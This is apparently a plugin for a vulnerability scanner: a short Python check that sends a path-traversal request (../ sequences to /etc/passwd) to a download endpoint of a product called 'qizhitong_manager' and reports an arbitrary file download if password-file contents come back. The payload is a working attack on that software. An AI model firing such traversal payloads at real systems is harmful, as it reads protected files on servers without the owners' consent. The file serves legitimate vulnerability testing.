#!/usr/bin/env python
#-*- coding:utf-8 -*-

def assign(service, arg):
	if service == 'qizhitong_manager':
		return True, arg

def audit(arg):
	payload = "test/downTcpdumpFile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
	url = arg + payload
	code, head, body, errcode, _url = curl.curl2(url)
	if code == 200 and 'root' in body and '/bin/bash' in body:
		security_warning('Arbitrary file download:'+url)


if __name__ == '__main__':
	from dummy import *
	audit(assign('qizhitong_manager', 'http://www.example.com/')[1])